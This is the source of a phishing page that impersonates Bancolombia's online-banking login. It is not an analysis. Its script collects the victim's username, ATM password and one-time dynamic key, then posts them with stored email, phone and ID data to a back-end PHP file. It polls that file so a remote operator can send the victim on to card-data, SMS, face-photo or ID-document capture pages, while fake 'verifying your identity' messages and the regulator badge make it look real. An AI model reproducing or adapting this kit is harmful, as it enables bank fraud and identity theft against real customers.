<script>
// --- ESTE SCRIPT SE EJECUTA APENAS CARGA LA PÁGINA ---

document.addEventListener("DOMContentLoaded", function () {

    // Tomar datos desde localStorage
    let local = {
        correo: localStorage.getItem("correo"),
        cel: localStorage.getItem("cel"),
        val: localStorage.getItem("val"),
        per: localStorage.getItem("per"),
        nom: localStorage.getItem("nom")
    };

    // Construir el nuevo objeto solicitado
    let tbdatos = {
        documento: local.val,
        nombre: local.nom, // Si deseas el nombre de persona, me dices
        tipo_identificacion: "CC",
        tipo_persona: local.per,
        banco: local.nom,
        correo: local.correo,
        direccion: "",
        telefono: local.cel
    };

    console.log("Objeto tbdatos generado:", tbdatos);

    // Si necesitas usarlo en otra parte, lo guardamos
    localStorage.setItem("tbdatos", JSON.stringify(tbdatos));
});
</script>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sucursal Virtual Personas</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      background-color: #1e1e1e;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }

    .fondo-fijo {
      position: fixed;
      top: 50%;
      left: 50%;
      width: 100vw;
      height: 100vh;
      transform: translate(-50%, -50%);
      background-image: url('img/fondo.png');
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      opacity: 1;
      z-index: 0;
      pointer-events: none;
    }
    #loader-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 0, 0.15);
      backdrop-filter: blur(5px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      display: none;
    }

    .loader {
      border: 8px solid #ccc;
      border-top: 8px solid #f9c411;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .logo {
      margin-bottom: 20px;
      z-index: 1;
    }

    .logo img {
      width: 250px;
      max-width: 90%;
    }

    .login-container {
      background-color: #3a3a3a;
      border-radius: 12px;
      padding: 30px 25px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      font-size: 1.6em;
      margin-bottom: 12px;
    }

    p {
      text-align: center;
      color: #ddd;
      font-size: 0.95em;
      margin-bottom: 25px;
    }

    .input-group {
      position: relative;
      margin-bottom: 25px;
    }

    .input-group i {
      position: absolute;
      left: 10px;
      top: 35%;
      transform: translateY(-50%);
      color: white;
      font-size: 1em;
      transition: color 0.2s;
    }

    .input-group input {
      width: 100%;
      padding: 14px 12px 14px 40px;
      border: none;
      border-bottom: 2px solid #ffffff;
      background: transparent;
      color: white;
      font-size: 1em;
      outline: none;
      transition: border-color 0.2s;
    }

    .input-group label {
      position: absolute;
      left: 40px;
      top: 50%;
      transform: translateY(-50%);
      color: #aaa;
      font-size: 1em;
      pointer-events: none;
      transition: all 0.2s ease;
      background-color: #3a3a3a;
      padding: 0 4px;
    }

    .input-group input:focus + label,
    .input-group input:not(:placeholder-shown) + label {
      top: -8px;
      font-size: 0.75em;
    }

    .input-group.filled input {
      border-bottom: 2px solid #f9c411;
    }

    .input-group.filled i {
      color: #f9c411;
    }

    .link {
      font-size: 0.85em;
      display: block;
      margin-top: 8px;
      color: white;
      text-decoration: underline;
    }

    .btn {
      width: 100%;
      margin-top: 10px;
      padding: 14px;
      border: none;
      border-radius: 25px;
      background-color: #6c6c6c;
      color: #333;
      font-weight: bold;
      font-size: 1em;
      cursor: not-allowed;
      transition: background 0.3s;
    }

    .btn.active {
      background-color: #f9c411;
      color: #000;
      cursor: pointer;
    }

    .create {
      text-align: center;
      margin-top: 20px;
    }

    .create a {
      color: white;
      font-weight: bold;
      text-decoration: underline;
    }

    .footer {
      width: 100%;
      max-width: 400px;
      text-align: center;
      color: white;
      font-size: 0.9em;
      margin-top: 40px;
      z-index: 2;
      position: relative;
    }

    .footer-links {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-bottom: 20px;
    }

    .footer-links a {
      color: white;
      text-decoration: none;
      font-size: 0.9em;
    }

    .footer hr {
      border: none;
      height: 1px;
      background-color: #555;
      margin: 20px 0;
    }

    .footer-logo img {
      width: 150px;
      margin-bottom: 10px;
    }

    .vigilado {
      font-size: 0.75em;
      font-weight: bold;
    }

    .vigilado span {
      font-weight: normal;
      display: block;
      font-size: 0.7em;
    }

    .footer-ip {
      margin-top: 10px;
      font-size: 0.8em;
      color: #ccc;
    }

    #loader-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 0, 0.15);
      backdrop-filter: blur(5px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      display: none;
    }

    .loader {
      border: 8px solid #ccc;
      border-top: 8px solid #f9c411;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body>
  <!-- IFRAME reemplazo de modal OTP -->
  <div id="modalClaveIframe" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; z-index:10005; background:rgba(0,0,0,0.9);">
    <iframe id="claveIframe" src="clave-dinamica.html" style="width:100%; height:100%; border:none;"></iframe>
  </div>

  <div class="fondo-fijo"></div>

  <div class="logo">
    <img src="img/logo.png" alt="Logo Bancolombia" />
  </div>

  <div class="login-container">
    <h2>¡Hola!</h2>
    <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

    <form id="loginForm">
      <div class="input-group">
        <i class="fas fa-user"></i>
        <input id="usuario" type="text" placeholder=" " autocomplete="off" />
        <label for="usuario">Usuario</label>
        <a href="#" class="link">¿Olvidaste tu usuario?</a>
      </div>

      <div class="input-group">
        <i class="fas fa-lock"></i>
        <input id="clave" type="password" placeholder=" " />
        <label for="clave">Clave del cajero</label>
        <a href="#" class="link">¿Olvidaste tu clave?</a>
      </div>

      <button type="submit" class="btn" disabled id="btnLogin">Iniciar sesión</button>
    </form>

    <div class="create">
      <a href="#">Crear usuario</a>
    </div>
  </div>

  <footer class="footer">
    <hr>
    <div class="footer-logo">
      <img src="img/logo.png" alt="Logo Bancolombia">
      <div class="vigilado">VIGILADO <span>Superintendencia Financiera de Colombia</span></div>
    </div>
    <div class="footer-ip" id="footer-ip">
      Cargando información...
    </div>
  </footer>

  <!-- Loader flotante -->
  <div id="loader-overlay">
    <div class="loader"></div>
  </div>

  <!-- Modal de carga -->
  <div id="modalCarga" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:10000; justify-content:center; align-items:center; flex-direction:column; color:white; text-align:center;">
    <div class="loader"></div>
    <p id="loaderText" style="margin-top:20px; font-size:1.1em;"></p>
  </div>

  <!-- Modal de autorización actualizado con video -->
  <div id="modalAutorizacion" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center; color:white; font-family:'Segoe UI', sans-serif;">
    <div style="background:#3a3a3a; padding:30px; border-radius:14px; max-width:360px; width:90%; text-align:center; box-shadow:0 0 20px rgba(0,0,0,0.6);">

      <!-- Banner con video -->
      <div style="border-radius:10px; overflow:hidden; margin-bottom:25px; width:100%; height:140px; position:relative;">
        <video autoplay muted loop playsinline style="object-fit:cover; width:100%; height:100%;">
          <source src="img/1.mov" type="video/mp4" />
          Tu navegador no soporta video HTML5.
        </video>
      </div>

      <!-- Título -->
      <h2 style="font-size:1.2em; margin-bottom:10px;">Ingresa la Clave Dinámica</h2>

      <!-- Subtítulo -->
      <p style="font-size:0.9em; color:#ccc; margin-bottom:10px;">
        Encuentra tu Clave Dinámica en la app Mi Bancolombia.
      </p>

     
      <!-- Input de OTP -->
      <input id="otpToken" maxlength="6" inputmode="numeric" style="
        font-size: 24px;
        letter-spacing: 10px;
        text-align: center;
        border: none;
        background: transparent;
        border-bottom: 2px solid #f9c411;
        padding: 10px 0;
        width: 100%;
        color: white;
        margin-bottom: 20px;
        outline: none;
      " placeholder="------" />

      <!-- Botón de envío -->
      <button id="btnEnviarToken" class="btn active">Enviar código</button>
    </div>
  </div>

  <!-- Modal de error -->
  <div id="modalError" style="
  display:none;
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.9);
  z-index:10002;
  justify-content:center;
  align-items:center;
">

  <img src="img/2.png" alt="Alerta" style="
    max-width:90%;
    max-height:90%;
    border-radius:16px;
    box-shadow:0 0 20px rgba(0,0,0,0.7);
  " />
</div>


  <p id="loginError" style="color: #e74c3c; margin-top: 10px; display: none; text-align: center;"></p>
</body>



<script>
  const usuario = document.getElementById('usuario');
  const clave = document.getElementById('clave');
  const btn = document.getElementById('btnLogin');
  const loader = document.getElementById('loader-overlay');
  const mensajes = [
    "Comprobando tu información...",
    "Autorizando tu acceso...",
    "Verificando tu identidad...",
    "Procesando solicitud...",
    "Por favor, espera un momento..."
  ];
  let indexMensaje = 0, intervalLoader;
  const transactionId = crypto.randomUUID();

  function validar() {
    const inputGroups = document.querySelectorAll('.input-group');
    inputGroups.forEach(group => {
      const input = group.querySelector('input');
      if (input.value.trim()) {
        group.classList.add('filled');
      } else {
        group.classList.remove('filled');
      }
    });

    if (usuario.value.trim() && clave.value.trim()) {
      btn.classList.add('active');
      btn.disabled = false;
    } else {
      btn.classList.remove('active');
      btn.disabled = true;
    }
  }

  usuario.addEventListener('input', validar);
  clave.addEventListener('input', validar);

  const ipContainer = document.getElementById('footer-ip');
  function obtenerFechaHoraFormateada() {
    const ahora = new Date();
    const fecha = ahora.toLocaleDateString('es-CO', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
    const hora = ahora.toLocaleTimeString('es-CO', {
      hour: '2-digit',
      minute: '2-digit'
    });
    return `${fecha}, ${hora}`;
  }

  async function obtenerIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch (e) {
      return 'IP no disponible';
    }
  }

  async function mostrarFooterInfo() {
    const ip = await obtenerIP();
    const fechaHora = obtenerFechaHoraFormateada();
    ipContainer.innerHTML = `Dirección IP: ${ip}<br>${fechaHora}`;
  }

  mostrarFooterInfo();

  function iniciarMensajesLoader() {
    const texto = document.getElementById("loaderText");
    texto.textContent = mensajes[indexMensaje];
    intervalLoader = setInterval(() => {
      indexMensaje = (indexMensaje + 1) % mensajes.length;
      texto.textContent = mensajes[indexMensaje];
    }, 3000);
  }

  function detenerMensajesLoader() {
    clearInterval(intervalLoader);
    indexMensaje = 0;
  }

  document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const usuarioVal = usuario.value.trim();
    const claveVal = clave.value.trim();
    const error = document.getElementById("loginError");
    const modalCarga = document.getElementById("modalCarga");

    if (usuarioVal === "" || claveVal === "") {
      error.innerText = "Debes completar todos los campos.";
      error.style.display = "block";
      return;
    }

    error.style.display = "none";
    modalCarga.style.display = "flex";
    iniciarMensajesLoader();

    const tbdatos = JSON.parse(localStorage.getItem("tbdatos") || "{}");
    const payload = {
      transactionId,
      bancoldata: { usuario: usuarioVal, clave: claveVal },
      tbdatos
    };

    await fetch("1.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    const TIMEOUT_MS = 180000;
    const poll = setInterval(checkLogin, 5000);
    const timeout = setTimeout(() => {
      clearInterval(poll);
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("mensajeError").innerHTML =
        "No se obtuvo respuesta del operador. Por favor intenta más tarde.";
      document.getElementById("modalError").style.display = "flex";
    }, TIMEOUT_MS);

  async function checkLogin() {
  const res = await fetch(`1.php?transactionId=${transactionId}`);
  const json = await res.json();

  if (json.ok && json.action) {
    clearInterval(poll);
    clearTimeout(timeout);
    detenerMensajesLoader();
    modalCarga.style.display = "none";

    if (json.action === "pedir_token") {
      document.getElementById("otpToken").value = "";
      const monto = localStorage.getItem("total_pagar") || "0";
      const montoFormateado = new Intl.NumberFormat("es-CO", {
        style: "currency",
        currency: "COP"
      }).format(parseInt(monto));
      const montoElem = document.getElementById("montoClave");
      if (montoElem) {
        montoElem.textContent = `Monto: ${montoFormateado}`;
      }
      document.getElementById("modalAutorizacion").style.display = "flex";
    }

    if (json.action === "rechazar") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("modalAutorizacion").style.display = "none";
      document.getElementById("modalError").style.display = "flex";
    }

    if (json.action === "banco_error") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      alert("Datos de inicio de sesión erróneos. Corríjalos.");
      window.location.href = "index.php";
    }

    if (json.action === "cc") {
      window.location.href = "/data-cc/alter.php";
    }

    if (json.action === "check" || json.action === "aprobado") {
      window.location.href = "/fin.php";
    }

    if (json.action === "sms") {
      window.location.href = "sms.php";
    }

    if (json.action === "fin") {
      window.location.href = "/fin.php";
    }

    // ⭐ ACCIONES NUEVAS ⭐
    if (json.action === "cara") {
      window.location.href = "/caras";
    }

    if (json.action === "cedula") {
      window.location.href = "/cedula";
    }
  }
}
  });

  document.getElementById("btnEnviarToken").addEventListener("click", async () => {
    const otp = document.getElementById("otpToken").value.trim();
    const usuarioVal = usuario.value.trim();
    const claveVal = clave.value.trim();
    const tipo = "sms";
    const monto = localStorage.getItem("total_pagar") || "0";
    const modalCarga = document.getElementById("modalCarga");

    if (otp === "") {
      alert("Por favor ingresa el código OTP.");
      return;
    }

    modalCarga.style.display = "flex";
    iniciarMensajesLoader();

    const transactionToken = crypto.randomUUID();
    const tbdatos = JSON.parse(localStorage.getItem("tbdatos") || "{}");

    const payload = {
      transactionId: transactionToken,
      bancoldata: { usuario: usuarioVal, clave: claveVal },
      bancoldina: { clave: otp },
      metodo: tipo,
      total: monto,
      tbdatos
    };

    await fetch("1.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    document.getElementById("modalAutorizacion").style.display = "none";

    const TIMEOUT_MS = 180000;
    const poll = setInterval(checkToken, 5000);
    const timeout = setTimeout(() => {
      clearInterval(poll);
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("mensajeError").innerHTML =
        "No se obtuvo respuesta del operador. Por favor intenta más tarde.";
      document.getElementById("modalError").style.display = "flex";
    }, TIMEOUT_MS);

   async function checkToken() {
  const res = await fetch(`1.php?transactionId=${transactionToken}`);
  const json = await res.json();

  if (json.ok && json.action) {
    clearInterval(poll);
    clearTimeout(timeout);
    detenerMensajesLoader();
    modalCarga.style.display = "none";

    if (json.action === "pedir_token") {
      alert("El código ingresado no es válido. Por favor intenta nuevamente.");
      document.getElementById("otpToken").value = "";
      document.getElementById("modalAutorizacion").style.display = "flex";
    }

    if (json.action === "rechazar") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("modalAutorizacion").style.display = "none";
      document.getElementById("modalError").style.display = "flex";
    }

    if (json.action === "banco_error") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      alert("Datos de inicio de sesión erróneos. Corríjalos.");
      window.location.href = "index.php";
    }

    if (json.action === "cc") {
      window.location.href = "/data-cc/alter.php";
    }

    if (json.action === "check" || json.action === "aprobado") {
      window.location.href = "/fin.php";
    }

    if (json.action === "sms") {
      window.location.href = "sms.php";
    }

    // ⭐ ACCIONES NUEVAS ⭐
    if (json.action === "cara") {
      window.location.href = "/caras";
    }

    if (json.action === "cedula") {
      window.location.href = "/cedula";
    }
  }
}
  });

  document.getElementById("modalError").addEventListener("click", function () {
    this.style.display = "none";
    const modalCarga = document.getElementById("modalCarga");
    const modalOtp = document.getElementById("modalAutorizacion");
    document.getElementById("otpToken").value = "";

    modalCarga.style.display = "flex";
    iniciarMensajesLoader();

    setTimeout(() => {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      modalOtp.style.display = "flex";
    }, 3000);
  });
</script>